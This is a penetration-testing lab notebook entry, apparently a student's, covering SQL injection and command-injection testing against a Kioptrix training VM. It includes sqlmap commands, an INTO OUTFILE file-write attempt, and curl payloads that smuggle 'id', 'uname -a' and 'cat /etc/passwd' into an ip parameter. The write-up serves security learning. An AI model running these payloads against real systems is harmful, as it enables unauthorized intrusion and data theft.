@@ -1,0 +1,161 @@
+# Day 22 – SQL Injection & Command Injection Validation
+
+Target: Kioptrix VM
+Target IP: 192.168.56.106
+Date: 2026-02-01
+Attacker OS: Kali Linux (192.168.56.100)
+
+## 1. Lab Objective
+
+The objective of Day 22 was to:
+
+- confirm SQL Injection vulnerability in the login form
+- attempt file write using SELECT ... INTO OUTFILE
+- test for Command Injection in pingit.php
+- correctly identify whether commands are executed on the attacker or target system
+- validate target IP address
+
+## 2. Network Discovery
+
+A network sweep was performed to identify live hosts:
+
+sudo nmap -sn 192.168.56.0/24
+
+Discovered Hosts:
+
+192.168.56.100 – Kali Linux (VirtualBox)
+
+192.168.56.106 – Kioptrix VM (VMware)
+
+192.168.56.1 – Network gateway
+
+192.168.56.102 – Host up, no HTTP service
+
+✅ Confirmed target system: 192.168.56.106
+
+## 3. SQL Injection – Login Form
+
+The login form on /index.php was tested using sqlmap:
+
+sqlmap -u "http://192.168.56.106/index.php" \
+
+--data="uname=admin&psw=test&btnLogin=Login"
+
+Results:
+
+Vulnerable parameter: uname
+
+Injection types:
+
+Boolean-based blind
+
+Time-based blind
+
+Back-end DBMS: MySQL < 5.0.12
+
+Operating System: Linux (CentOS)
+
+Stacked queries: ❌ Not supported
+
+4. SQL File Write Attempt (INTO OUTFILE)
+
+An attempt was made to write a file to the target filesystem:
+
+sqlmap -u "http://192.168.56.106/index.php" \
+
+--data="uname=admin&psw=test&btnLogin=Login" \
+
+--sql-query="SELECT 'TEST123' INTO OUTFILE '/tmp/day22.txt'"
+
+Outcome:
+File was not written
+
+Reason:
+
+No stacked query support
+
+Likely missing FILE privilege
+
+Old MySQL version limitations
+
+SQL-based file write failed
+
+5. Command Injection Testing – pingit.php
+
+The endpoint pingit.php was tested for command execution via the ip parameter.
+
+Payloads used:
+
+curl -X POST http://192.168.56.106/pingit.php -d "ip=127.0.0.1;id"
+
+curl -X POST http://192.168.56.106/pingit.php -d "ip=127.0.0.1;uname -a"
+
+Server Response:
+
+127.0.0.1;id
+
+127.0.0.1;uname -a
+
+Analysis:
+
+Payloads were reflected
+
+Commands were not executed
+
+No command injection vulnerability identified
+
+6. False Positive Analysis – Local Command Execution
+
+Example payload:
+
+curl -X POST http://192.168.56.106/pingit.php -d "ip=$(cat /etc/passwd)"
+
+Observation:
+
+Output contained user jacaz07
+
+Shell /usr/bin/zsh
+
+Kali Linux user structure
+
+Conclusion:
+
+$(...) was expanded locally on the attacker machine
+
+The server only received static text
+
+This was not the target’s /etc/passwd
+
+## 7. SSH Enumeration
+
+SSH access was tested:
+
+ssh john@192.168.56.106
+
+Result:
+
+no matching key exchange method found
+
+Interpretation:
+
+SSH service is running
+
+Uses deprecated key exchange algorithms
+
+Possible attack vector for later exploitation
+
+## 8. Final Conclusions
+
+Test Area  Result
+
+SQL Injection  ✅ Confirmed
+
+SQL File Write  ❌ Failed
+
+Command Injection  ❌ Not Vulnerable
+
+Local Command Confusion  ✅ Identified
+
+SSH Service  ✅ Present (legacy)
+
+No shell or file write access was obtained during Day 22.
